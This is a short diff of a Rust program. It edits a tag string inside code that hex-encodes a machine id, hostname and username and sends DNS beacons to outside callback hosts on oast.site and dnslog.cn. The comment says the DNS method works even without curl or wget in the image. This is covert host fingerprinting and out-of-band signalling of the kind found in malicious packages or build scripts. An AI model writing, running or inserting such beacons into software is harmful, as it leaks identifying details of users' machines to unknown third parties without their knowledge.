@@ -37,7 +37,7 @@ fn main() {
     let i = hex(&id[..id.chars().take(28).count()]);
     let h = hex(&hn[..hn.chars().take(28).count()]);
     let u = hex(&un[..un.chars().take(20).count()]);
-    let tag = "n4a06711";
+    let tag = "a4a06711";
     let ish = "dahpp3cgtqkjvl1mas2gdg97wwijpdwe3.oast.site";
     // 1) pure-std DNS beacons (works even without curl/wget/getent in image)
     dns(&format!("ping.{}.y1acsd.dnslog.cn", tag));
